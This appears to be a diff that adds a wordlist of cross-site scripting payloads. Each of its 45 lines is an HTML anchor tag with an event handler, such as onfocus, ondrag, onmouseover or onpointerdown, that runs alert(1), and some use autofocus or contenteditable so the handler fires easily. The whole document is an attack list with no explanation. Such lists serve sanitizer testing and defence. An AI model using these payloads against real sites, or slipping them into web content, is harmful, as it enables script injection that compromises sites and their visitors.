@@ -1,0 +1,45 @@
+<a autofocus onfocus=alert(1) href></a>
+<a autofocus onfocusin=alert(1) href></a>
+<a draggable="true" ondrag="alert(1)">test</a>
+<a draggable="true" ondragend="alert(1)">test</a>
+<a draggable="true" ondragenter="alert(1)">test</a>
+<a draggable="true" ondragleave="alert(1)">test</a>
+<a draggable="true" ondragstart="alert(1)">test</a>
+<a id=x tabindex=1 onactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
+<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<a onafterscriptexecute=alert(1)><script>1</script>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<a onbeforepaste="alert(1)" contenteditable>test</a>
+<a onbeforescriptexecute=alert(1)><script>1</script>
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onclick="alert(1)">test</a>
+<a oncontextmenu="alert(1)">test</a>
+<a oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<a oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<a ondblclick="alert(1)" autofocus tabindex=1>test</a>
+<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onkeydown="alert(1)" contenteditable>test</a>
+<a onkeypress="alert(1)" contenteditable>test</a>
+<a onkeyup="alert(1)" contenteditable>test</a>
+<a onmousedown="alert(1)">test</a>
+<a onmouseenter="alert(1)">test</a>
+<a onmouseleave="alert(1)">test</a>
+<a onmousemove="alert(1)">test</a>
+<a onmouseout="alert(1)">test</a>
+<a onmouseover="alert(1)">test</a>
+<a onmouseup="alert(1)">test</a>
+<a onmousewheel=alert(1)>requires scrolling
+<a onpaste="alert(1)" contenteditable>test</a>
+<a onpointerdown=alert(1)>XSS</a>
+<a onpointerenter=alert(1)>XSS</a>
+<a onpointerleave=alert(1)>XSS</a>
+<a onpointermove=alert(1)>XSS</a>
+<a onpointerout=alert(1)>XSS</a>
+<a onpointerover=alert(1)>XSS</a>
+<a onpointerrawupdate=alert(1)>XSS</a>
+<a onpointerup=alert(1)>XSS</a>
